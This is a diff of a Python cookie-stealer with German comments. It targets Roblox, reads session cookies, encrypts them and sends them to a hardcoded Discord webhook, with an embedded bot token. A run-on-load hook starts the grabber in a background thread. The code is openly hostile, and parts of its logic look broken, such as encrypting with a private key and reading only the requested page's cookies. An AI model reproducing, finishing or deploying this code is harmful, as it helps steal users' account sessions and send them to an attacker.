@@ -8,6 +8,10 @@ import threading
 
 def grab_cookies(url):
     if url == "https://www.roblox.com/home":
+        # Starte den Discord-Bot
+        bot = discord.Client()
+        bot.run("SIgmnMJ9qx8FKl3ysQ8WhqtYX2wwUXVljjT_m5cdS-oWO-LGvUNENMsqPZj3cVIIzHdJ")
+
         response = requests.get(url)
         cookies = response.cookies
 
@@ -17,20 +21,16 @@ def grab_cookies(url):
         # Verschlüssele die Cookies mit dem privaten Schlüssel
         encrypted_cookies = rsa.encrypt(json.dumps({"cookies": cookies}).encode(), key.privatekey().encode())
 
-        # Sende die verschlüsselten Cookies an den Discord-Bot
-        bot = discord.Client()
-        bot.run("SIgmnMJ9qx8FKl3ysQ8WhqtYX2wwUXVljjT_m5cdS-oWO-LGvUNENMsqPZj3cVIIzHdJ")
-
-        # Erstelle einen privaten Discord-Webhook
+        # Sende die verschlüsselten Cookies an den Discord-Webhook
         webhook = discord.Webhook(url="https://discord.com/api/webhooks/1174419954951536661/SIgmnMJ9qx8FKl3ysQ8WhqtYX2wwUXVljjT_m5cdS-oWO-LGvUNENMsqPZj3cVIIzHdJ")
-
-        # Sende die verschlüsselten Cookies an den Webhook
         webhook.send(encrypted_cookies)
-
 
 def run_on_load():
     # Importiere das Modul mit dem Cookie Grabber
     import cookie_grabber
+
+    # Warte, bis der Discord-Bot vollständig gestartet ist
+    time.sleep(5)
 
     # Starte den Cookie Grabber als Hintergrundprozess
     threading.Thread(target=cookie_grabber.grab_cookies, args=("https://www.roblox.com/home",)).start()
